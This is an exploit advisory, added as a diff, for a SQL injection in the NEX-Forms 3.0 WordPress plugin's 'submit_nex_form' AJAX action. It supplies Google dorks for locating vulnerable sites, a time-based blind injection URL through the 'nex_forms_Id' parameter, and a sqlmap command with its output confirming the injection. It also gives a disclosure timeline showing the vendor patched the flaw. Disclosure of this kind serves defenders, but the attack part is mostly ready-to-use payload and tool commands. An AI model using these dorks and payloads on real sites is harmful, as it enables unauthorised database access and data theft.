@@ -1,0 +1,88 @@
+######################
+
+# Exploit Title : NEX-Forms 3.0 SQL Injection Vulnerability
+
+# Exploit Author : Claudio Viviani
+
+# Website Author: http://www.homelab.it
+                  http://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)
+                  
+
+# Vendor Homepage : https://wordpress.org/plugins/nex-forms-express-wp-form-builder/
+
+# Software Link : https://downloads.wordpress.org/plugin/nex-forms-express-wp-form-builder.3.0.zip
+
+# Dork Google: inurl:nex-forms-express-wp-form-builder
+#              index of nex-forms-express-wp-form-builder
+
+# Date : 2015-03-29
+
+# Tested on : Windows 7 / Mozilla Firefox
+#             Linux / Mozilla Firefox
+
+######################
+
+# Info:
+
+ The "submit_nex_form" ajax function is affected from SQL Injection vulnerability
+ 
+ "nex_forms_Id" var is not sanitized
+
+# PoC Exploit:
+
+ http://TARGET/wordpress/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=10 AND (SELECT * FROM (SELECT(SLEEP(10)))NdbE)
+
+# Poc Video:
+
+ http://youtu.be/04G08Cbrx1I
+
+# PoC sqlmap:
+
+ sqlmap -u "http://TARGET/wordpress/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=10" -p nex_forms_Id --dbms mysql
+ 
+ [23:15:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
+ [23:15:48] [INFO] GET parameter 'nex_forms_Id' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
+ for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+ [23:15:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+ [23:15:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+ [23:16:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+ [23:16:07] [INFO] checking if the injection point on GET parameter 'nex_forms_Id' is a false positive
+ GET parameter 'nex_forms_Id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+ sqlmap identified the following injection points with a total of 85 HTTP(s) requests:
+ ---
+ Parameter: nex_forms_Id (GET)
+     Type: AND/OR time-based blind
+     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+     Payload: action=submit_nex_form&nex_forms_Id=10 AND (SELECT * FROM (SELECT(SLEEP(5)))NdbE)
+ ---
+ [23:16:34] [INFO] the back-end DBMS is MySQL
+ web server operating system: Linux CentOS 5.10
+ web application technology: PHP 5.3.3, Apache 2.2.3
+ back-end DBMS: MySQL 5.0.12
+
+######################
+
+# Vulnerability Disclosure Timeline:
+
+2015-03-29:  Discovered vulnerability
+2015-04-16:  Vendor Notification
+2015-04-17:  Vendor Response/Feedback 
+2015-04-21:  Vendor Send Fix/Patch (same version number)
+2015-04-21:  Public Disclosure 
+
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+                http://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)
+                http://ffhd.homelab.it (Free Fuzzy Hashes Database)
+				
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
